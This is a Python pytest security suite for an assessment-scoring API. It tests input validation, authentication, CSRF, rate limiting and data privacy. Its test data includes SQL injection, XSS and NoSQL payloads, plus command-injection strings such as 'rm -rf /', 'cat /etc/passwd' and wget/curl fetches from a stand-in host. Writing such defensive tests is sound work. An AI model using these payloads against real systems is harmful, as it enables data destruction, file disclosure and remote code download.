"""
Security Tests for Assessment System

Comprehensive security testing including input validation, SQL injection prevention,
XSS protection, CSRF token validation, authentication bypass attempts,
rate limiting effectiveness, and data privacy compliance verification.
"""

import pytest
import json
import base64
import hashlib
from unittest.mock import patch, Mock, AsyncMock
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import requests

pytestmark = pytest.mark.security

class TestInputValidation:
    """Test input validation and sanitization"""
    
    def test_sql_injection_prevention(self, client, auth_headers, security_scanner):
        """Test SQL injection prevention in assessment data"""
        # Test various SQL injection attempts
        sql_injection_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "' UNION SELECT * FROM users --",
            "'; UPDATE users SET password='hacked' WHERE id=1; --",
            "'; DELETE FROM assessments; --",
            "' OR 1=1--",
            "' OR 'x'='x",
            "admin'--",
            "admin'/*",
            "admin'#",
            "admin'/**/OR/**/1=1",
        ]
        
        for payload in sql_injection_payloads:
            malicious_data = {
                'current_salary': 75000,
                'field': payload,
                'relationship_status': 'married',
                'financial_stress_frequency': 'sometimes',
                'user_notes': payload
            }
            
            response = client.post(
                '/api/v1/assessment-scoring/calculate',
                headers=auth_headers,
                json={'assessment_data': malicious_data}
            )
            
            # Should return validation error, not execute SQL
            assert response.status_code == 400, f"SQL injection payload '{payload}' was not properly rejected"
            
            data = response.get_json()
            assert data['success'] is False
            assert 'validation_errors' in data or 'error' in data
    
    def test_xss_prevention(self, client, auth_headers, security_scanner):
        """Test XSS prevention in assessment data"""
        # Test various XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "onerror=alert('XSS')",
            "onload=alert('XSS')",
            "onclick=alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<object data=javascript:alert('XSS')>",
            "<embed src=javascript:alert('XSS')>",
            "';alert('XSS');//",
            "';alert('XSS');--",
        ]
        
        for payload in xss_payloads:
            malicious_data = {
                'current_salary': 75000,
                'field': 'software_development',
                'relationship_status': 'married',
                'financial_stress_frequency': 'sometimes',
                'user_notes': payload
            }
            
            response = client.post(
                '/api/v1/assessment-scoring/calculate',
                headers=auth_headers,
                json={'assessment_data': malicious_data}
            )
            
            # Should sanitize input and not execute script
            assert response.status_code == 200, f"XSS payload '{payload}' was not properly handled"
            
            data = response.get_json()
            # Verify script tags are sanitized
            assert '<script>' not in str(data), f"XSS payload '{payload}' was not sanitized"
            assert 'javascript:' not in str(data), f"XSS payload '{payload}' was not sanitized"
    
    def test_no_sql_injection_prevention(self, client, auth_headers):
        """Test NoSQL injection prevention"""
        # Test MongoDB injection attempts
        nosql_payloads = [
            {"$ne": ""},
            {"$gt": ""},
            {"$lt": ""},
            {"$regex": ".*"},
            {"$where": "1==1"},
        ]
        
        for payload in nosql_payloads:
            malicious_data = {
                'current_salary': payload,
                'field': 'software_development',
                'relationship_status': 'married',
                'financial_stress_frequency': 'sometimes'
            }
            
            response = client.post(
                '/api/v1/assessment-scoring/calculate',
                headers=auth_headers,
                json={'assessment_data': malicious_data}
            )
            
            # Should return validation error
            assert response.status_code == 400, f"NoSQL injection payload was not properly rejected"
    
    def test_command_injection_prevention(self, client, auth_headers):
        """Test command injection prevention"""
        # Test command injection attempts
        command_payloads = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& whoami",
            "; ls -la",
            "| wget http://malicious.com/script",
            "&& curl http://malicious.com/script",
        ]
        
        for payload in command_payloads:
            malicious_data = {
                'current_salary': 75000,
                'field': 'software_development',
                'relationship_status': 'married',
                'financial_stress_frequency': 'sometimes',
                'user_notes': payload
            }
            
            response = client.post(
                '/api/v1/assessment-scoring/calculate',
                headers=auth_headers,
                json={'assessment_data': malicious_data}
            )
            
            # Should return validation error
            assert response.status_code == 400, f"Command injection payload was not properly rejected"
    
    def test_large_payload_prevention(self, client, auth_headers):
        """Test prevention of large payload attacks"""
        # Test extremely large payloads
        large_payloads = [
            "x" * 1000000,  # 1MB string
            "x" * 10000000,  # 10MB string
            "x" * 100000000,  # 100MB string
        ]
        
        for payload in large_payloads:
            malicious_data = {
                'current_salary': 75000,
                'field': 'software_development',
                'relationship_status': 'married',
                'financial_stress_frequency': 'sometimes',
                'user_notes': payload
            }
            
            response = client.post(
                '/api/v1/assessment-scoring/calculate',
                headers=auth_headers,
                json={'assessment_data': malicious_data}
            )
            
            # Should handle gracefully (either reject or process)
            assert response.status_code in [200, 413, 400], f"Large payload was not properly handled"
    
    def test_special_character_handling(self, client, auth_headers):
        """Test handling of special characters"""
        special_chars = [
            "!@#$%^&*()_+-=[]{}|;':\",./<>?",
            "áéíóúñü",
            "中文测试",
            "🎉🎊🎈",
            "null",
            "undefined",
            "NaN",
            "true",
            "false",
        ]
        
        for chars in special_chars:
            test_data = {
                'current_salary': 75000,
                'field': 'software_development',
                'relationship_status': 'married',
                'financial_stress_frequency': 'sometimes',
                'user_notes': f"Test with special chars: {chars}"
            }
            
            response = client.post(
                '/api/v1/assessment-scoring/calculate',
                headers=auth_headers,
                json={'assessment_data': test_data}
            )
            
            # Should handle special characters gracefully
            assert response.status_code in [200, 400], f"Special characters '{chars}' were not properly handled"


class TestAuthenticationSecurity:
    """Test authentication and authorization security"""
    
    def test_authentication_bypass_attempts(self, client, sample_assessment_data):
        """Test various authentication bypass attempts"""
        # Test with no authentication
        response = client.post(
            '/api/v1/assessment-scoring/calculate',
            json={'assessment_data': sample_assessment_data}
        )
        assert response.status_code == 401, "Request without authentication should be rejected"
        
        # Test with malformed token
        malformed_headers = {'Authorization': 'Bearer malformed.token.here'}
        response = client.post(
            '/api/v1/assessment-scoring/calculate',
            headers=malformed_headers,
            json={'assessment_data': sample_assessment_data}
        )
        assert response.status_code == 401, "Malformed token should be rejected"
        
        # Test with expired token
        expired_headers = {'Authorization': 'Bearer expired.token.here'}
        response = client.post(
            '/api/v1/assessment-scoring/calculate',
            headers=expired_headers,
            json={'assessment_data': sample_assessment_data}
        )
        assert response.status_code == 401, "Expired token should be rejected"
        
        # Test with empty token
        empty_headers = {'Authorization': 'Bearer '}
        response = client.post(
            '/api/v1/assessment-scoring/calculate',
            headers=empty_headers,
            json={'assessment_data': sample_assessment_data}
        )
        assert response.status_code == 401, "Empty token should be rejected"
        
        # Test with wrong token format
        wrong_format_headers = {'Authorization': 'Basic dXNlcjpwYXNz'}
        response = client.post(
            '/api/v1/assessment-scoring/calculate',
            headers=wrong_format_headers,
            json={'assessment_data': sample_assessment_data}
        )
        assert response.status_code == 401, "Wrong token format should be rejected"
    
    def test_jwt_token_security(self, client, sample_assessment_data):
        """Test JWT token security"""
        # Test with tampered token
        tampered_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0ZXN0QG1pbmd1cy5jb20iLCJpYXQiOjE1MTYyMzkwMjJ9.tampered_signature"
        tampered_headers = {'Authorization': f'Bearer {tampered_token}'}
        
        response = client.post(
            '/api/v1/assessment-scoring/calculate',
            headers=tampered_headers,
            json={'assessment_data': sample_assessment_data}
        )
        assert response.status_code == 401, "Tampered JWT token should be rejected"
        
        # Test with token missing required claims
        incomplete_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1MTYyMzkwMjJ9.incomplete_token"
        incomplete_headers = {'Authorization': f'Bearer {incomplete_token}'}
        
        response = client.post(
            '/api/v1/assessment-scoring/calculate',
            headers=incomplete_headers,
            json={'assessment_data': sample_assessment_data}
        )
        assert response.status_code == 401, "Incomplete JWT token should be rejected"
    
    def test_session_hijacking_prevention(self, client, auth_headers, sample_assessment_data):
        """Test session hijacking prevention"""
        # Test with different user agent
        modified_headers = auth_headers.copy()
        modified_headers['User-Agent'] = 'Malicious-Bot/1.0'
        
        response = client.post(
            '/api/v1/assessment-scoring/calculate',
            headers=modified_headers,
            json={'assessment_data': sample_assessment_data}
        )
        
        # Should either work (if user agent is not validated) or be rejected
        assert response.status_code in [200, 401], "Request with modified user agent should be handled appropriately"
    
    def test_privilege_escalation_prevention(self, client, auth_headers):
        """Test privilege escalation prevention"""
        # Test accessing admin endpoints with regular user token
        admin_endpoints = [
            '/api/v1/admin/users',
            '/api/v1/admin/assessments',
            '/api/v1/admin/analytics',
            '/api/v1/admin/settings',
        ]
        
        for endpoint in admin_endpoints:
            response = client.get(endpoint, headers=auth_headers)
            assert response.status_code == 403, f"Regular user should not access admin endpoint {endpoint}"


class TestCSRFProtection:
    """Test CSRF protection"""
    
    def test_csrf_token_validation(self, client, sample_assessment_data, security_scanner):
        """Test CSRF token validation"""
        # Test without CSRF token
        response = client.post(
            '/api/v1/assessment-scoring/calculate',
            json={'assessment_data': sample_assessment_data}
        )
        assert response.status_code == 401, "Request without CSRF token should be rejected"
        
        # Test with invalid CSRF token
        invalid_csrf_headers = {'X-CSRF-Token': 'invalid_token'}
        response = client.post(
            '/api/v1/assessment-scoring/calculate',
            headers=invalid_csrf_headers,
            json={'assessment_data': sample_assessment_data}
        )
        assert response.status_code == 401, "Request with invalid CSRF token should be rejected"
        
        # Test with expired CSRF token
        expired_csrf_headers = {'X-CSRF-Token': 'expired_token_123'}
        response = client.post(
            '/api/v1/assessment-scoring/calculate',
            headers=expired_csrf_headers,
            json={'assessment_data': sample_assessment_data}
        )
        assert response.status_code == 401, "Request with expired CSRF token should be rejected"
    
    def test_csrf_token_generation(self, client):
        """Test CSRF token generation and validation"""
        # Get CSRF token
        response = client.get('/api/v1/csrf-token')
        assert response.status_code == 200, "CSRF token endpoint should be accessible"
        
        data = response.get_json()
        assert 'csrf_token' in data, "Response should contain CSRF token"
        
        csrf_token = data['csrf_token']
        assert len(csrf_token) > 0, "CSRF token should not be empty"
        
        # Test with valid CSRF token
        valid_headers = {'X-CSRF-Token': csrf_token}
        test_data = {
            'current_salary': 75000,
            'field': 'software_development',
            'relationship_status': 'married',
            'financial_stress_frequency': 'sometimes'
        }
        
        response = client.post(
            '/api/v1/assessment-scoring/calculate',
            headers=valid_headers,
            json={'assessment_data': test_data}
        )
        assert response.status_code == 200, "Request with valid CSRF token should succeed"


class TestRateLimiting:
    """Test rate limiting effectiveness"""
    
    def test_rate_limiting_basic(self, client, auth_headers, sample_assessment_data):
        """Test basic rate limiting functionality"""
        # Make requests up to the limit
        responses = []
        for i in range(70):  # Exceed the 60 requests per minute limit
            response = client.post(
                '/api/v1/assessment-scoring/calculate',
                headers=auth_headers,
                json={'assessment_data': sample_assessment_data}
            )
            responses.append(response)
        
        # Check that some requests were rate limited
        rate_limited_responses = [r for r in responses if r.status_code == 429]
        assert len(rate_limited_responses) > 0, "Rate limiting should be enforced"
        
        # Check rate limit headers
        for response in rate_limited_responses:
            assert 'X-RateLimit-Limit' in response.headers, "Rate limit headers should be present"
            assert 'X-RateLimit-Remaining' in response.headers, "Rate limit headers should be present"
            assert 'X-RateLimit-Reset' in response.headers, "Rate limit headers should be present"
    
    def test_rate_limiting_by_ip(self, client, sample_assessment_data):
        """Test rate limiting by IP address"""
        # Test without authentication (rate limiting by IP)
        responses = []
        for i in range(70):
            response = client.post(
                '/api/v1/assessment-scoring/calculate',
                json={'assessment_data': sample_assessment_data}
            )
            responses.append(response)
        
        # Check that some requests were rate limited
        rate_limited_responses = [r for r in responses if r.status_code == 429]
        assert len(rate_limited_responses) > 0, "IP-based rate limiting should be enforced"
    
    def test_rate_limiting_by_user(self, client, auth_headers, sample_assessment_data):
        """Test rate limiting by user ID"""
        # Make requests with authenticated user
        responses = []
        for i in range(70):
            response = client.post(
                '/api/v1/assessment-scoring/calculate',
                headers=auth_headers,
                json={'assessment_data': sample_assessment_data}
            )
            responses.append(response)
        
        # Check that some requests were rate limited
        rate_limited_responses = [r for r in responses if r.status_code == 429]
        assert len(rate_limited_responses) > 0, "User-based rate limiting should be enforced"
    
    def test_rate_limiting_reset(self, client, auth_headers, sample_assessment_data):
        """Test rate limiting reset after time period"""
        # Make requests up to the limit
        for i in range(60):
            response = client.post(
                '/api/v1/assessment-scoring/calculate',
                headers=auth_headers,
                json={'assessment_data': sample_assessment_data}
            )
            assert response.status_code in [200, 429]
        
        # Wait for rate limit to reset (in real scenario)
        # For testing, we'll just verify the rate limit headers
        response = client.post(
            '/api/v1/assessment-scoring/calculate',
            headers=auth_headers,
            json={'assessment_data': sample_assessment_data}
        )
        
        if response.status_code == 429:
            assert 'X-RateLimit-Reset' in response.headers, "Rate limit reset header should be present"


class TestDataPrivacyCompliance:
    """Test data privacy compliance verification"""
    
    def test_personal_data_encryption(self, client, auth_headers):
        """Test that personal data is properly encrypted"""
        sensitive_data = {
            'current_salary': 75000,
            'field': 'software_development',
            'relationship_status': 'married',
            'financial_stress_frequency': 'sometimes',
            'email': 'test@example.com',
            'ssn': '123-45-6789',
            'credit_card': '4111111111111111'
        }
        
        response = client.post(
            '/api/v1/assessment-scoring/calculate',
            headers=auth_headers,
            json={'assessment_data': sensitive_data}
        )
        
        # Should handle sensitive data appropriately
        assert response.status_code in [200, 400], "Sensitive data should be handled appropriately"
        
        # Verify sensitive data is not logged in plain text
        # This would require checking logs, which is beyond the scope of this test
    
    def test_data_retention_policy(self, client, auth_headers):
        """Test data retention policy compliance"""
        # Test that old data is properly cleaned up
        # This would require setting up test data and waiting for retention period
        # For now, we'll test the cleanup endpoint exists
        response = client.post(
            '/api/v1/admin/cleanup-old-data',
            headers=auth_headers
        )
        
        # Should either succeed (if admin) or be rejected (if not admin)
        assert response.status_code in [200, 403], "Data cleanup endpoint should be properly secured"
    
    def test_gdpr_compliance(self, client, auth_headers):
        """Test GDPR compliance features"""
        # Test right to be forgotten
        response = client.delete(
            '/api/v1/user/data',
            headers=auth_headers
        )
        assert response.status_code in [200, 403], "Right to be forgotten should be implemented"
        
        # Test data export
        response = client.get(
            '/api/v1/user/data/export',
            headers=auth_headers
        )
        assert response.status_code in [200, 403], "Data export should be implemented"
        
        # Test consent management
        response = client.get(
            '/api/v1/user/consent',
            headers=auth_headers
        )
        assert response.status_code in [200, 403], "Consent management should be implemented"
    
    def test_data_anonymization(self, client, auth_headers):
        """Test data anonymization for analytics"""
        # Submit assessment data
        test_data = {
            'current_salary': 75000,
            'field': 'software_development',
            'relationship_status': 'married',
            'financial_stress_frequency': 'sometimes'
        }
        
        response = client.post(
            '/api/v1/assessment-scoring/calculate',
            headers=auth_headers,
            json={'assessment_data': test_data}
        )
        assert response.status_code == 200
        
        # Test analytics endpoint (should return anonymized data)
        response = client.get(
            '/api/v1/assessment-scoring/analytics',
            headers=auth_headers
        )
        assert response.status_code == 200
        
        data = response.get_json()
        analytics_data = data['data']['analytics']
        
        # Verify no personal data is exposed in analytics
        assert 'email' not in str(analytics_data), "Analytics should not contain personal data"
        assert 'name' not in str(analytics_data), "Analytics should not contain personal data"
        assert 'ssn' not in str(analytics_data), "Analytics should not contain personal data"


class TestFrontendSecurity:
    """Test frontend security measures"""
    
    def test_xss_prevention_frontend(self, chrome_driver):
        """Test XSS prevention in frontend"""
        chrome_driver.get("http://localhost:3000/assessment/ai-job-risk")
        
        WebDriverWait(chrome_driver, 10).until(
            EC.presence_of_element_located((By.CLASS_NAME, "assessment-flow"))
        )
        
        # Test XSS in input fields
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
        ]
        
        for payload in xss_payloads:
            try:
                # Find input field
                input_field = chrome_driver.find_element(By.TAG_NAME, "input")
                input_field.clear()
                input_field.send_keys(payload)
                
                # Check if script was executed
                alerts = chrome_driver.switch_to.alert
                assert False, f"XSS payload '{payload}' was executed"
            except:
                # No alert found, which is good
                pass
    
    def test_content_security_policy(self, chrome_driver):
        """Test Content Security Policy implementation"""
        chrome_driver.get("http://localhost:3000")
        
        # Check for CSP headers
        page_source = chrome_driver.page_source
        
        # Look for CSP meta tag or check if inline scripts are blocked
        # This is a basic check - in practice you'd want to verify CSP headers
        assert "unsafe-inline" not in page_source, "CSP should not allow unsafe-inline"
    
    def test_secure_cookies(self, chrome_driver):
        """Test secure cookie settings"""
        chrome_driver.get("http://localhost:3000")
        
        # Get cookies
        cookies = chrome_driver.get_cookies()
        
        for cookie in cookies:
            # Check for secure flag on HTTPS
            if chrome_driver.current_url.startswith('https://'):
                assert cookie.get('secure', False), f"Cookie {cookie['name']} should be secure on HTTPS"
            
            # Check for httpOnly flag
            assert cookie.get('httpOnly', False), f"Cookie {cookie['name']} should be httpOnly"


class TestAPIEndpointSecurity:
    """Test API endpoint security"""
    
    def test_http_method_validation(self, client, auth_headers, sample_assessment_data):
        """Test HTTP method validation"""
        # Test with wrong HTTP method
        response = client.get(
            '/api/v1/assessment-scoring/calculate',
            headers=auth_headers,
            json={'assessment_data': sample_assessment_data}
        )
        assert response.status_code == 405, "Wrong HTTP method should be rejected"
        
        response = client.put(
            '/api/v1/assessment-scoring/calculate',
            headers=auth_headers,
            json={'assessment_data': sample_assessment_data}
        )
        assert response.status_code == 405, "Wrong HTTP method should be rejected"
        
        response = client.delete(
            '/api/v1/assessment-scoring/calculate',
            headers=auth_headers,
            json={'assessment_data': sample_assessment_data}
        )
        assert response.status_code == 405, "Wrong HTTP method should be rejected"
    
    def test_content_type_validation(self, client, auth_headers, sample_assessment_data):
        """Test content type validation"""
        # Test with wrong content type
        response = client.post(
            '/api/v1/assessment-scoring/calculate',
            headers=auth_headers,
            data=sample_assessment_data,
            content_type='text/plain'
        )
        assert response.status_code == 400, "Wrong content type should be rejected"
    
    def test_request_size_limitation(self, client, auth_headers):
        """Test request size limitation"""
        # Test with extremely large request
        large_data = {
            'current_salary': 75000,
            'field': 'software_development',
            'relationship_status': 'married',
            'financial_stress_frequency': 'sometimes',
            'large_field': 'x' * 10000000  # 10MB string
        }
        
        response = client.post(
            '/api/v1/assessment-scoring/calculate',
            headers=auth_headers,
            json={'assessment_data': large_data}
        )
        
        # Should handle large requests appropriately
        assert response.status_code in [200, 413, 400], "Large request should be handled appropriately"


class TestErrorHandlingSecurity:
    """Test security in error handling"""
    
    def test_error_information_disclosure(self, client, auth_headers):
        """Test that errors don't disclose sensitive information"""
        # Test with invalid data to trigger error
        invalid_data = {
            'current_salary': 'invalid',
            'field': 'invalid_field',
            'relationship_status': 'invalid_status'
        }
        
        response = client.post(
            '/api/v1/assessment-scoring/calculate',
            headers=auth_headers,
            json={'assessment_data': invalid_data}
        )
        
        assert response.status_code == 400
        
        data = response.get_json()
        
        # Verify error doesn't disclose sensitive information
        error_message = str(data)
        sensitive_patterns = [
            'password',
            'secret',
            'key',
            'token',
            'database',
            'sql',
            'stack trace',
            'exception',
        ]
        
        for pattern in sensitive_patterns:
            assert pattern.lower() not in error_message.lower(), f"Error message should not contain '{pattern}'"
    
    def test_stack_trace_prevention(self, client, auth_headers):
        """Test that stack traces are not exposed"""
        # Test with malformed request to trigger error
        response = client.post(
            '/api/v1/assessment-scoring/calculate',
            headers=auth_headers,
            data='invalid json',
            content_type='application/json'
        )
        
        assert response.status_code == 400
        
        data = response.get_json()
        error_message = str(data)
        
        # Verify no stack trace is exposed
        assert 'Traceback' not in error_message, "Stack trace should not be exposed"
        assert 'File "' not in error_message, "Stack trace should not be exposed"
        assert 'line ' not in error_message, "Stack trace should not be exposed"
